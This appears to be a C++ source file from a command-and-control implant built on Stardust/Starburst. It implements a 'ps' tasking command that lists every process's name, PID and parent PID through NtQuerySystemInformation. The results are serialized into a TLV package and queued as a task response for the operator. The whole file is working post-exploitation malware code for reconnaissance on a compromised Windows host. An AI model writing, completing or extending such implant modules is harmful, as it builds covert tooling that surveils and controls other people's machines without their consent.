#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PS

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_ps(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // query system process information
    ULONG buf_size = 0x10000;
    auto  buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
    if ( !buf ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    ULONG ret_len = 0;
    NTSTATUS status = inst.ntdll.NtQuerySystemInformation(
        SystemProcessInformation, buf, buf_size, &ret_len
    );

    // retry with larger buffer
    if ( status == STATUS_INFO_LENGTH_MISMATCH ) {
        inst.heap_free( buf );
        buf_size = ret_len + 0x1000;
        buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
        if ( !buf ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }
        status = inst.ntdll.NtQuerySystemInformation(
            SystemProcessInformation, buf, buf_size, &ret_len
        );
    }

    if ( status != 0 ) {
        inst.heap_free( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NtQuerySystemInformation failed" ) ) );
        return;
    }

    // build response: TLV with process entries
    auto pkg = package_create( inst );
    if ( !pkg ) {
        inst.heap_free( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
    package_add_string( inst, pkg, task_uuid );
    package_add_byte( inst, pkg, RESPONSE_SUCCESS );

    // count + entries
    uint32_t count = 0;
    auto entries = package_create( inst );

    auto spi = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>( buf );

    while ( true ) {
        char proc_name[260] = { 0 };
        if ( spi->ImageName.Buffer && spi->ImageName.Length > 0 ) {
            inst.kernel32.WideCharToMultiByte(
                CP_ACP, 0,
                spi->ImageName.Buffer,
                spi->ImageName.Length / sizeof(wchar_t),
                proc_name, 260, nullptr, nullptr
            );
        } else {
            str_copy( proc_name, symbol<char*>( const_cast<char*>( "[System Process]" ) ) );
        }

        uint32_t pid  = static_cast<uint32_t>( reinterpret_cast<uintptr_t>( spi->UniqueProcessId ) );
        uint32_t ppid = static_cast<uint32_t>( reinterpret_cast<uintptr_t>( spi->InheritedFromUniqueProcessId ) );

        // name(string) + pid(uint32) + ppid(uint32)
        package_add_string( inst, entries, proc_name );
        package_add_int32( inst, entries, pid );
        package_add_int32( inst, entries, ppid );

        count++;

        if ( spi->NextEntryOffset == 0 ) break;
        spi = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<uint8_t*>( spi ) + spi->NextEntryOffset
        );
    }

    inst.heap_free( buf );

    package_add_int32( inst, pkg, count );
    uint32_t entries_len = 0;
    auto entries_data = package_build( entries, &entries_len );
    if ( entries_len > 0 ) {
        for ( uint32_t i = 0; i < entries_len; i++ ) {
            package_add_byte( inst, pkg, entries_data[i] );
        }
    }
    package_destroy( inst, entries );

    // queue
    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( new_cap < needed ) new_cap *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, new_cap )
        );
        inst.response_queue.capacity = new_cap;
    }

    auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
    qbuf[0] = (data_len >> 24) & 0xFF;
    qbuf[1] = (data_len >> 16) & 0xFF;
    qbuf[2] = (data_len >> 8)  & 0xFF;
    qbuf[3] = data_len & 0xFF;
    memory::copy( qbuf + 4, data, data_len );
    inst.response_queue.length += 4 + data_len;

    package_destroy( inst, pkg );
}

#endif
